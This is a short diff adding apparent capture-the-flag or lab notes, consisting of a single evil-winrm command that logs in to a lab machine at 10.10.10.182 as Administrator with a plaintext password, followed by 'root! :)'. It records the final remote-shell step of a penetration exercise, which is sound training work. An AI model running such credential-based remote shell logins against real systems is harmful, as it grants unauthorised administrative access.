@@ -1,0 +1,5 @@
+
+
+sudo evil-winrm -u Administrator -p 'baCT3r1aN00dles' -i 10.10.10.182
+
+root! :)
